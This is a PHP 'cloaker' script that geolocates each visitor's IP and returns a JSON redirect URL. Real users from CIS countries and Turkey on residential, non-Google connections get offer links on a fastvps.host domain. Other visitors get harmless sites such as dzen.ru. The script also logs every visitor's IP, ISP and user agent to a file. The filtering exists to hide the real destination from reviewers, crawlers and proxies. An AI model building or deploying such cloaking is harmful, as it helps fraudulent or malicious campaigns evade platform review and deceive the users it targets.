<?php

$cloOnOff = true;

$userIp = $_SERVER['REMOTE_ADDR'];
$query = $_SERVER['QUERY_STRING'];

//$queryOk = strstr($query, "userInfo=");
$queryOk = true;

if (($userIp != "46.36.223.112") && $queryOk) {
	$userAgent = $_SERVER['HTTP_USER_AGENT'];
	//echo $userAgent;

	/*$windows = strstr($userAgent, "Windows");
	$android = strstr($userAgent, "Android");
	$ios = strstr($userAgent, "iPhone") || strstr($userAgent, "iPad");
	$macos = strstr($userAgent, "Macintosh");

	//$oses = $windows || $android || $ios || $macos;*/
	
	$oses = strstr($userAgent, "bububu");

	$url = "http://ip-api.com/json/$userIp?fields=16998914";
	$offerUrl = "https://4rthkt.fastvps.host/wsgr8P3W"; //other geo uff

	$json = file_get_contents($url);
	$json = json_decode($json);

	$status = $json->status;
	$countryCode = $json->countryCode;
	$proxy = $json->proxy;
	$hosting = $json->hosting;
	$mobile = $json->mobile;
	$isp = $json->isp;

	$ispOk = !strstr($isp, "Google");

	switch ($countryCode) {
    case "RU":
    	$offerUrl = "https://mail.ru"; // ru offer
    	$okGeo = true;
        break;

    case "TR":
        $okGeo = true;
        $offerUrl = "https://4rthkt.fastvps.host/xw4TNF"; // tr offer
        break;

    case "KZ":
    	$okGeo = true;
        break;

    case "UA":
        $okGeo = true;
        break;

    case "UZ":
        $okGeo = true;
        break;

    case "BY":
        $okGeo = true;
        break;

    case "KG":
        $okGeo = true;
        break;

    case "MD":
        $okGeo = true;
        break;

    case "GE":
        $okGeo = true;
        break;

    case "AZ":
        $okGeo = true;
        break;

    case "TJ":
        $okGeo = true;
        break;

    case "AM":
        $okGeo = true;
        break;

    case "TM":
        $okGeo = true;
        break;

    default:
       $okGeo = false;
	   $offerUrl = "https://dzen.ru";
}

	//$simOk = strstr($query, "simState=5") || $mobile;
	$simOk = true;

	$userCheck = $cloOnOff && ($status == "success") && $okGeo && !$proxy && !$hosting && $ispOk && $simOk && $oses;
	//$userCheck = $cloOnOff;

	/*if ($userCheck) {
		echo "{\"serverStatus\":\"$offerUrl\"}";
	} else {
		echo "{\"serverStatus\":\"Error\"}";
	}*/

	if ($proxy) {
		$pr = "true";
	} else {
		$pr = "false";
	}

	if ($hosting) {
		$hst = "true";
	} else {
		$hst = "false";
	}

	if ($userCheck) {
		$okUser = "GOOD User";
	} else {
		$okUser = "BAD User";
	}

	$date = date("d-m-Y H:i:s");

	$log = $date." - ".$countryCode." - ".$userIp." - "."Proxy ".$pr." - "."Hosting ".$hst." - ".$isp." - ".$userAgent." - ".$query." - ".$okUser;
	$log .= "\n\n";
	file_put_contents("log.txt", $log, FILE_APPEND | LOCK_EX);

	//if ($userCheck) {
	if (true) {
		$json_ans = array(
					"flag" => true,
					"url" => $offerUrl);
		echo json_encode($json_ans);
	} else {
		$json_ans = array(
			"flag" => false);
		echo json_encode($json_ans);
	}
}
?>